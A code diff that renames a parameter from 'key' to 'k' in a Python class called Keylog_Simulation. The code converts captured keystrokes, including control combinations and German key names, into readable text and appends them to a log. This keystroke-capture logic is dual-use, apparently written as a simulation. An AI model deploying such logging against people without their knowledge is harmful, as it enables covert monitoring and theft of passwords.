@@ -13,11 +13,11 @@ import pyperclip
 class Keylog_Simulation():
 
     # Helper for formatting logged keys
-    def get_char(self, key):
+    def get_char(self, k):
         '''Convert KeyCodes to readable string'''
         try:
             # Try to get the character of the key directly
-            pressed_key = str(key.char)
+            pressed_key = str(k.char)
             # Key combos with control
             if self.last_key == " |ctrl| " or self.last_key == " |steuerung| " or "ombo " in self.last_key: # noqa: 501
                 if self.last_key == " |ctrl| ":
@@ -42,21 +42,21 @@ class Keylog_Simulation():
             return pressed_key
         except AttributeError:
             # Cut out 'Key.' and '_l' or '_r' from KeyCode string
-            if "_l" in str(key) or "_r" in str(key):
+            if "_l" in str(k) or "_r" in str(k):
                 try:
-                    return self.key_translation_dict[str(key)[4:-2]]
+                    return self.key_translation_dict[str(k)[4:-2]]
                 except Exception:
-                    return (" " + str(key)[4:-2] + " ")
+                    return (" " + str(k)[4:-2] + " ")
             else:
                 try:
-                    return self.key_translation_dict[str(key)[4:]]
+                    return self.key_translation_dict[str(k)[4:]]
                 except Exception:
-                    return (" " + str(key)[4:] + " ")
+                    return (" " + str(k)[4:] + " ")
 
     # Logging function
-    def on_press(self, key):
+    def on_press(self, k):
         '''For Keylogger'''
-        c = str(self.get_char(key))
+        c = str(self.get_char(k))
         self.last_key = c
         self.log = self.log + c
 
